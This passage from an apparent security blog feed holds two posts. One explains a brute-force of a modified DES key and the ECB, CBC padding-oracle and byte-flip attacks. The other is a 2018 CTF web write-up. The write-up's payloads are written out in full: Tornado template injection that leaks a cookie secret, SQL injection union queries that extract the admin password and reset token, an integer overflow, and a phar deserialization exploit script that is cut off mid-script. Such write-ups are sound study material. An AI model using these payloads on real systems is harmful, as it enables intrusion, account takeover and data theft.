class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>,<span class="number">8</span>):</span><br><span class="line">result[(pos&lt;&lt;<span class="number">3</span>)+i]=(ch&gt;&gt;i)&amp;<span class="number">1</span></span><br><span class="line">pos+=<span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p><p>可以发现这个根本不是原版的pydes库的函数，我们来看看原版函数:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">__String_to_BitList</span><span class="params">(self, data)</span>:</span></span><br><span class="line"><span class="string">"""Turn the string data, into a list of bits (1, 0)'s"""</span></span><br><span class="line"><span class="keyword">if</span> _pythonMajorVersion &lt; <span class="number">3</span>:</span><br><span class="line"><span class="comment"># Turn the strings into integers. Python 3 uses a bytes</span></span><br><span class="line"><span class="comment"># class, which already has this behaviour.</span></span><br><span class="line">data = [ord(c) <span class="keyword">for</span> c <span class="keyword">in</span> data]</span><br><span class="line">l = len(data) * <span class="number">8</span></span><br><span class="line">result = [<span class="number">0</span>] * l</span><br><span class="line">pos = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> ch <span class="keyword">in</span> data:</span><br><span class="line">i = <span class="number">7</span></span><br><span class="line"><span class="keyword">while</span> i &gt;= <span class="number">0</span>:</span><br><span class="line"><span class="keyword">if</span> ch &amp; (<span class="number">1</span> &lt;&lt; i) != <span class="number">0</span>:</span><br><span class="line">result[pos] = <span class="number">1</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">result[pos] = <span class="number">0</span></span><br><span class="line">pos += <span class="number">1</span></span><br><span class="line">i -= <span class="number">1</span></span><br><span class="line"><span class="keyword">return</span> result</span><br></pre></td></tr></table></figure></p><p>容易发现，我们题目中的处理deskey的函数：</p><ul><li>会先把deskey转换成64bit的二进制</li><li>然后将64bit的2进制，8个一组进行分组</li><li>再对每一组倒叙输出</li><li>然后再把8组拼接回来<br>什么意思呢？<br>比如<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">abcdefjhABCDEFJH</span><br></pre></td></tr></table></figure></li></ul><p>他处理后会变成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hjfedcbaHJFEDCBA</span><br></pre></td></tr></table></figure></p><p>所以我们的deskey要进行处理:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deskey_old = &apos;1100001&quot;+c+&quot;1111011&quot;+f+&quot;0010011&quot;+g+&quot;1001011&quot;+h+&quot;0111011&quot;+i+&quot;1110001&quot;+L+&quot;1000011&quot;+o+&quot;1001111&quot;+p&apos;.replace(&apos;&quot;+&apos;,&apos;&apos;).replace(&apos;+&quot;&apos;,&apos;&apos;)</span><br><span class="line">deskey_new = &quot;&quot;</span><br><span class="line">for i in range(0,len(deskey_old),8):</span><br><span class="line">    deskey_new += deskey_old[i:i+8][::-1]</span><br><span class="line">print deskey_new</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c1000011f1101111g1100100h1101001i1101110L1000111o1100001p1111001</span><br></pre></td></tr></table></figure></p><p>然后我们就可以爆破8bit寻找可读明文字符串了<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">def bintostr(str):</span><br><span class="line">    res = &quot;&quot;</span><br><span class="line">    for i in range(0,len(str),8):</span><br><span class="line">        res += chr(int(str[i:i+8],2))</span><br><span class="line">    return res</span><br><span class="line">for c in &quot;01&quot;:</span><br><span class="line">    for f in &quot;01&quot;:</span><br><span class="line">        for g in &quot;01&quot;:</span><br><span class="line">            for h in &quot;01&quot;:</span><br><span class="line">                for i in &quot;01&quot;:</span><br><span class="line">                    for L in &quot;01&quot;:</span><br><span class="line">                        for o in &quot;01&quot;:</span><br><span class="line">                            for p in &quot;01&quot;:</span><br><span class="line">                                str = c+&quot;1000011&quot;+f+&quot;1101111&quot;+g+&quot;1100100&quot;+h+&quot;1101001&quot;+i+&quot;1101110&quot;+L+&quot;1000111&quot;+o+&quot;1100001&quot;+p+&quot;1111001&quot;</span><br><span class="line">                                str = bintostr(str)</span><br><span class="line">                                print str</span><br></pre></td></tr></table></figure></p><p>运行程序容易发现,只有一个可见字符串:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CodinGay</span><br></pre></td></tr></table></figure></p><p>所以这一定是我们的deskey，后续的步骤就不再写出了，和这篇文章标题不符，也比较容易了，毕竟有Key，直接解就行了</p><h2 id="分组问题"><a href="#分组问题" class="headerlink" title="分组问题"></a>分组问题</h2><h3 id="ECB-Replay-Attack"><a href="#ECB-Replay-Attack" class="headerlink" title="ECB-Replay Attack"></a>ECB-Replay Attack</h3><p>ECB模式相对来说，是最简单的一个模式，如图<br><img src="/images/2018-10-30-09-06-53.png" alt=""><br>其就是将明文分成多块，然后加密，那么这样就一定会存在重放攻击的危险，例如<br><img src="/images/2018-10-30-09-07-48.png" alt=""></p><ul><li>银行A给银行B传输信息使用ECB模式</li><li>窃贼C中间拦截下了该消息</li><li>窃贼C将密文中的一组替换成了自己的信息</li><li>导致银行B得到的消息被篡改<br>我们可以看到，该过程中，C对该密码算法的密钥是完全未知的，他可以向银行A或者银行B打钱，这样就能拥有密文，可以将其中的账号的密文组抠出来，用来替换<br>注：当然如果有签名校验就是另一回事了，这里我们单看这个模式的安全性<h3 id="CBC-Padding-Oracle-Attack"><a href="#CBC-Padding-Oracle-Attack" class="headerlink" title="CBC-Padding Oracle Attack"></a>CBC-Padding Oracle Attack</h3>CBC加密模式：<br><img src="/images/enc.png" alt=""><br>CBC解密模式：<br><img src="/images/dec.png" alt=""><br>这里主要关注一下解密过程<br>密文cipher首先进行一系列处理，如图中的Block Cipher Decryption<br>我们将处理后的值称为middle中间值<br>然后middle与我们输入的iv进行异或操作<br>得到的即为明文<br>但这里有一个规则叫做Padding填充：<br>因为加密是按照16位一组分组进行的<br>而如果不足16位，就需要进行填充<br><img src="/images/padding.png" alt=""><br>比如我们的明文为admin<br>则需要被填充为 <code>admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b</code><br>一共11个<code>\x0b</code><br>如果我们输入一个错误的iv，依旧是可以解密的，但是middle和我们输入的iv经过异或后得到的填充值可能出现错误<br>比如本来应该是<code>admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b</code><br>而我们错误的得到<code>admin\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x0b\x3b\x2c</code><br>这样解密程序往往会抛出异常<code>(Padding Error)</code><br>应用在web里的时候，往往是302或是500报错<br>而正常解密的时候是200<br>所以这时，我们可以根据服务器的反应来判断我们输入的iv<br>我们假设middle中间值为(为了方便，这里按8位分组来阐述)<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d</span><br></pre></td></tr></table></figure></li></ul><p>正确的解密iv应该为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x6d 0x36 0x70 0x76 0x03 0x6e 0x22 0x39</span><br></pre></td></tr></table></figure></p><p>解密后正确的明文为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">T E S T 0x04 0x04 0x04 0x04</span><br></pre></td></tr></table></figure></p><p>但是关键点在于，我们可以知道iv的值，却不能得到中间值和解密后明文的值<br>而我们的目标是只根据我们输入的iv值和服务器的状态去判断出解密后明文的值<br>这里的攻击即叫做<code>Padding Oracle Attack</code><br>这时候我们选择进行爆破攻击<br>首先输入iv<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x00</span><br></pre></td></tr></table></figure></p><p>这时候和中间值middle进行异或得到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d</span><br></pre></td></tr></table></figure></p><p>而此时程序会校验最后一位padding字节是否正确<br>我们知道正确的padding的值应该只有<code>0x01~0x08</code>，这里是<code>0x3d</code>，显然是错误的<br>所以程序会抛出500<br>知道这一点后，我们可以通过遍历最后一位iv，从而使这个iv和middle值异或后的最后一位是我们需要<code>0x01</code><br>这时候有256种可能，不难遍历出<br>Iv:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00 0x00 0x00 0x00 0x00 0x00 0x00 0x3c</span><br></pre></td></tr></table></figure></p><p>Middle:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d</span><br></pre></td></tr></table></figure></p><p>两者异或后得到的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x01</span><br></pre></td></tr></table></figure></p><p>这时候程序校验最后一位，发现是0x01，即可通过校验，服务器返回200<br>我们根据这个200就可以判断出，这个iv正确了<br>然后我们有公式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Middle[8]^原来的iv[8] = plain[8]</span><br><span class="line">Middle[8]^现在的iv[8] = 0x01</span><br></pre></td></tr></table></figure></p><p>故此，我们可以算出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">middle[8] = 0x01^现在的iv[8]</span><br></pre></td></tr></table></figure></p><p>然后带入式1：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plain[8] = 0x01^现在的iv[8]^原来的iv</span><br></pre></td></tr></table></figure></p><p>即可获取明文<code>plain[8]= 0x01^0x3c^0x39=0x04</code><br>和我们之前解密成功的明文一致（最后4位为填充）<br>下面我们需要获取plain[7]<br>方法还是如出一辙<br>但是这里需要将iv更新，因为这次我们需要的是2个0x02，而非之前的一个0x01<br>所以我们需要将<code>现在的iv[8] = middle[8]^0x02</code><br>注：为什么是<code>现在iv[8] = middle[8]^0x02</code>？<br>因为<code>现在的iv[8]^middle[8]=服务器校验的值</code><br>而我们遍历倒数第二位，应该是2个0x02，所以服务器希望得到的是0x02，所以<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">现在的iv[8]^middle[8]=0x02</span><br><span class="line">故此iv[8] = middle[8]^0x02</span><br></pre></td></tr></table></figure></p><p>然后再继续遍历现在的<code>iv[7]</code><br>方法还是和上面一样，遍历后可以得到<br>Iv:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x00 0x00 0x00 0x00 0x00 0x00 0x24 0x3f</span><br></pre></td></tr></table></figure></p><p>Middle:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6a 0x26 0x3d</span><br></pre></td></tr></table></figure></p><p>两者异或后得到的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x39 0x73 0x23 0x22 0x07 0x6a 0x02 0x02</span><br></pre></td></tr></table></figure></p><p>然后此时的明文值：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Plain[7]=现在的iv[7]^原来的iv[7]^0x02</span><br></pre></td></tr></table></figure></p><p>所以<code>Plain[7] = 0x02^0x24^0x22=0x04</code><br>和我们之前解密成功的明文一致（最后4位为填充）<br>最后遍历循环，即可得到完整的plain</p><h3 id="CBC-Byte-Flip-Attack"><a href="#CBC-Byte-Flip-Attack" class="headerlink" title="CBC-Byte Flip Attack"></a>CBC-Byte Flip Attack</h3><p>这个实际上和padding oracle攻击差不多<br><img src="/images/dec.png" alt=""><br>还是关注这个解密过程<br>但这时，我们是已知明文，想利用iv去改变解密后的明文<br>比如我们知道明文解密后是<code>1dmin</code><br>我们想构造一个iv，让他解密后变成<code>admin</code><br>还是原来的思路<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">原来的Iv[1]^middle[1]=plain[1]</span><br></pre></td></tr></table></figure></p><p>而此时<br>我们想要<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造的iv[1]^mddle[1]=’a’</span><br></pre></td></tr></table></figure></p><p>所以我们可以得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造的iv[1] = middle[1]^’a’</span><br></pre></td></tr></table></figure></p><p>而<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">middle[1]=原来的iv[1]^plain[1]</span><br></pre></td></tr></table></figure></p><p>所以最后可以得到公式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">构造的iv[1]= 原来的iv[1]^plain[1]^’a’</span><br></pre></td></tr></table></figure></p><p>所以即可造成数据的伪造<br>我们可以用这个式子，遍历明文，构造出iv，让程序解密出我们想要的明文</p><h3 id="CFB-Replay-Attack"><a href="#CFB-Replay-Attack" class="headerlink" title="CFB-Replay Attack"></a>CFB-Replay Attack</h3><p>CFB模式的加解密方式：<br><img src="/images/2018-10-30-09-20-38.png" alt=""><br>这里有一道例题写的比较详细，我就不再赘述：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.ifuryst.com/archives/AES_CFB_Attack.html</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>后面应该还会继续做一些补充和探索，因为Crypto纯属兴趣，毕竟我是个web狗，若文章中有错误，还请指出：）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="crypto" scheme="http://skysec.top/categories/crypto/"/>
    
    
      <category term="crypto" scheme="http://skysec.top/tags/crypto/"/>
    
  </entry>
  
  <entry>
    <title>2018护网杯-web-writeup</title>
    <link href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/"/>
    <id>http://skysec.top/2018/10/13/2018护网杯-web-writeup/</id>
    <published>2018-10-13T09:18:44.000Z</published>
    <updated>2018-10-14T07:11:00.241Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于安全客 https://www.anquanke.com/post/id/161849</span><br></pre></td></tr></table></figure><h2 id="前记"><a href="#前记" class="headerlink" title="前记"></a>前记</h2><p>护网杯刚结束，记录一下做出的3道web（1道赛后解出），很遗憾有一道java没能解出。</p><h2 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy tornado"></a>easy tornado</h2><p>进入题目<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/</span><br></pre></td></tr></table></figure></p><p>发现有3个选项<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/file?filename=Orz.txt&amp;signature=9e3bb6483951e58b6095f949d572dd9a</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Orz.txt </span><br><span class="line">render()</span><br><span class="line"></span><br><span class="line">http://49.4.78.81:30980/file?filename=hint.txt&amp;signature=74dfcb55b94ddbe4daedd3f21a68a2f1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint.txt </span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line"></span><br><span class="line">http://49.4.78.81:30980/file?filename=flag.txt&amp;signature=6a86c265598a92ae8bff5c9f7b9f2a72</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag.txt </span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure></p><p>发现意思很明确，有签名，读文件<br>那么现在要做的就是leak cookie_secret<br>发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/error?msg=&#123;&#123;1^0&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>可以进行模板注入，但过滤了非常多的符号，应该只能读个变量<br>阅读tornado源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/tornadoweb/tornado/blob/master/tornado/auth.py</span><br></pre></td></tr></table></figure></p><p>发现<code>handler.settings</code>存放了cookie_secret<br>读取<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/error?msg=&#123;&#123;handler.settings&#125;&#125;</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;&apos;login_url&apos;: &apos;/login&apos;, &apos;template_path&apos;: &apos;templates&apos;, &apos;xsrf_cookies&apos;: True, &apos;cookie_secret&apos;: &apos;0tG+hY[4ekR($v72OzJa)M9d!jV8sF.n1&gt;&#123;Zo#*pPIm_&lt;W%L3-T~AuQlBbqr6&#125;ig&apos;, &apos;debug&apos;: False, &apos;file_path&apos;: &apos;/www/static/files&apos;, &apos;static_path&apos;: &apos;static&apos;&#125;</span><br></pre></td></tr></table></figure></p><p>随机构造签名读flag<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:30980/file?filename=/fllllllllllag&amp;signature=7bae09c2c6e2f6aa34df7dbee23db960</span><br></pre></td></tr></table></figure></p><p>得到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/fllllllllllag </span><br><span class="line">flag&#123;67a3d3dec827645c1c92d1f2160c744f&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ltshop"><a href="#ltshop" class="headerlink" title="ltshop"></a>ltshop</h2><p>本能的条件竞争，换大辣条，50个线程，跑完发现自己有7个大辣条了，看来竞争略有成效<br>下面是辣条之王的艺术，考虑到是go语言，uint64可能存在溢出<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://www.it1352.com/808569.html</span><br></pre></td></tr></table></figure></p><p>于是思考到，这里我们的兑换量应该*5，于是简单计算了一下<br><img src="/images/2018-10-13-20-04-14.png" alt=""><br>然后我们这里兑换3689348814741910324即可溢出<br><img src="/images/2018-10-13-20-01-41.png" alt=""><br><img src="/images/2018-10-13-20-01-52.png" alt=""></p><h2 id="easy-web"><a href="#easy-web" class="headerlink" title="easy_web"></a>easy_web</h2><p>赛后问了下，得知了题解，如下<br><img src="/images/8ECF780413C0B16EAB5A9CBC27D340D6.png" alt=""><br><img src="/images/B23978EFC504FD81383F78A38BD16060.png" alt=""><br><img src="/images/B3396986B3B3C6E857EF0236C42C6678.png" alt=""><br><img src="/images/616CA965F40642A8C2A4231C74CDB4F7.png" alt=""><br><img src="/images/82731F9DCCECE49BB4ED6C7D9BA1FF36.png" alt=""></p><p><img src="/images/78690348780A7D7B626AA8FD2A06322B.png" alt=""></p><h2 id="easy-laravel"><a href="#easy-laravel" class="headerlink" title="easy_laravel"></a>easy_laravel</h2><h3 id="源码发现"><a href="#源码发现" class="headerlink" title="源码发现"></a>源码发现</h3><p>这是本次的重量级题目：首先在f12源代码里发现<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- code: https://github.com/qqqqqqvq/easy_laravel --&gt;</span><br></pre></td></tr></table></figure></p><h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>于是下载源码，看一下控制器，不难发现有注入点<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">easy_laravel/app/Http/Controllers/NoteController.php</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-10-13-20-06-54.png" alt=""><br>于是尝试<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; or 1#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-10-13-20-07-43.png" alt=""><br>发现可以读到note，于是尝试union select<br>然后遇到了第一个坑点，我们在代码里可以看到<br><img src="/images/2018-10-13-20-08-28.png" alt=""><br>于是我认为应该只有4列，然后一直就是wrong,wrong,wrong<br>很头疼的尝试了order by，发现是5列<br>注册：<code>admin&#39; order by 5#</code><br><img src="/images/2018-10-13-20-09-52.png" alt=""><br>注册：<code>admin&#39; order by 6#</code><br><img src="/images/2018-10-13-20-10-15.png" alt=""><br>然后尝试union select<br><img src="/images/2018-10-13-20-12-12.png" alt=""><br>根据给出的表，我再信他一回：）<br><img src="/images/2018-10-13-20-12-48.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; union select 1,(select password from users limit 0,1),3,4,5#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-10-13-20-15-05.png" alt=""><br><img src="/images/2018-10-13-20-16-19.png" alt=""><br>到这里为止，发现密码无法破解<br>那么如何登入管理员呢？</p><h3 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h3><p>这里还有一个表<br><img src="/images/2018-10-13-20-16-45.png" alt=""><br>我们发现还能重置密码，而且只需要email和token！<br>那我们去拿管理员的token<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; union select 1,(select token from password_resets limit 1,1),3,4,5#</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-10-13-20-22-31.png" alt=""><br>然后去重置管理员密码即可<br><img src="/images/2018-10-13-20-24-58.png" alt=""><br>然后使用路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.81:31250/password/reset/1c9d0f377a75dd48abaa90dd7fa4eb35653da39561d6f9c33bdb14a8a0849616</span><br></pre></td></tr></table></figure></p><p><img src="/images/2018-10-13-20-25-56.png" alt=""><br>然后改密码即可登入管理员<br>到此为止，我们离flag又近了一步</p><h3 id="登入后台"><a href="#登入后台" class="headerlink" title="登入后台"></a>登入后台</h3><p><img src="/images/2018-10-13-20-27-48.png" alt=""><br>发现有4个功能：upload,files,flag,note<br>这里flag点进去发现是<code>no flag</code><br>加上题目的提示：<br><img src="/images/2018-10-13-20-29-53.png" alt=""><br>可以发现是blade过期的问题，这里简单搜索<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/7d65f9eb94be</span><br></pre></td></tr></table></figure></p><p>发现Blade 是 laravel 提供的一个简单强大的模板引擎。它不像其他流行的 PHP 模板引擎那样限制你在视图中使用原生的 PHP 代码，事实上它就是把 Blade 视图编译成原生的 PHP 代码并缓存起来。缓存会在 Blade 视图改变时而改变，这意味着 Blade 并没有给你的应用添加编译的负担。<br>所以我们这的思路很清晰：<br>1.因为旧的缓存存在，导致我们看不到flag<br>2.我们可以利用pop chain删掉缓存文件<br>3.读到flag<br>那么缓存文件在哪里呢？我们查看源码发现<br><img src="/images/2018-10-13-18-34-21.png" alt=""><br>那cachepath又是哪里呢？想到最开始的提示<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nginx是坠吼的 ( 好麻烦，默认配置也是坠吼的</span><br></pre></td></tr></table></figure></p><p>那么很容易得知web目录<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nginx/html</span><br></pre></td></tr></table></figure></p><p>然后再去发掘blade缓存位置<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.jianshu.com/p/018c83d6b38c</span><br></pre></td></tr></table></figure></p><p>发现是<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/storage/framework/views</span><br></pre></td></tr></table></figure></p><p>再结合sha1，得到最后的路径<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php</span><br></pre></td></tr></table></figure></p><h3 id="反序列化删除发掘"><a href="#反序列化删除发掘" class="headerlink" title="反序列化删除发掘"></a>反序列化删除发掘</h3><p>那么去哪里找删除函数呢？<br>这里发现<code>composer.json</code>中提供了大量组件，我们安装一下，然后全局搜索，容易发现有<code>unlink()</code><br><img src="/images/2018-10-13-18-47-52.png" alt=""></p><h3 id="phar神来之笔"><a href="#phar神来之笔" class="headerlink" title="phar神来之笔"></a>phar神来之笔</h3><p>那最后怎么触发序列化呢？这里用到了我们BlackHat会议演讲的phar://方法<br>参考这篇文章<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xz.aliyun.com/t/2715</span><br></pre></td></tr></table></figure></p><p>我们发现在check这里<br><img src="/images/2018-10-13-20-41-29.png" alt=""><br>是会使用file_exists的，并且path和filename可控！<br>于是我们尝试构造<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">include</span>(<span class="string">'autoload.php'</span>);</span><br><span class="line">    $a = serialize(<span class="keyword">new</span> Swift_ByteStream_TemporaryFileByteStream());</span><br><span class="line">    var_dump(unserialize($a));</span><br><span class="line">    var_dump($a);</span><br><span class="line">    $a = preg_replace(<span class="string">'/\/private\/var\/folders\/dm\/r80s8lp52bz1rcdhp5h9zlrw0000gn\/T\/FileByteStream[\w]&#123;6&#125;/'</span>, <span class="string">"/usr/share/nginx/html/storage/framework/views/34e41df0934a75437873264cd28e2d835bc38772.php"</span>, $a);</span><br><span class="line">    $a = str_replace(<span class="string">'s:77'</span>, <span class="string">'s:90'</span>, $a);</span><br><span class="line">    $b = unserialize($a);</span><br><span class="line">    $p = <span class="keyword">new</span> Phar(<span class="string">'./skyfuck.phar'</span>, <span class="number">0</span>);</span><br><span class="line">    $p-&gt;startBuffering();</span><br><span class="line">    $p-&gt;setStub(<span class="string">'GIF89a&lt;?php __HALT_COMPILER(); 